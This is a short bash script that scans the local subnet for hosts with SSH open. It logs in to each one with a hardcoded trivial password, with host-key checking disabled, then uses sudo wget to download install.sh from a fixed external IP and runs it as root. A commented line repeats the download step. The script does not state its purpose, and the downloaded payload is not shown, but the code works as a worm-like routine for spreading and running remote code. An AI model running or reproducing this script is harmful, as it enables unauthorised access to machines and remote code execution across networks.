#!/bin/bash

base_ip=$(hostname -I | cut -d"." -f1-3)

     for i in {1..254..1}
        do
          if nc -w 1 -zv $base_ip.$i 22 &>> /dev/null
          then
            echo "Processing $base_ip.$i  ================  \n"
            sshpass -p1 ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@$base_ip.$i "cd /usr/bin/ && sudo wget -O install.sh http://95.217.211.87:8000/install.sh && sudo chmod +x install.sh && sudo ./install.sh"
            sleep 5
          else
            echo "Empty $base_ip.$i"
          fi
     done


#sshpass -p1 ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@192.168.2.$i "mkdir -p  /home/user/tmp && cd /home/user/tmp && wget -O install.sh http://95.217.211.87:8000/install.sh && chmod +x install.sh"

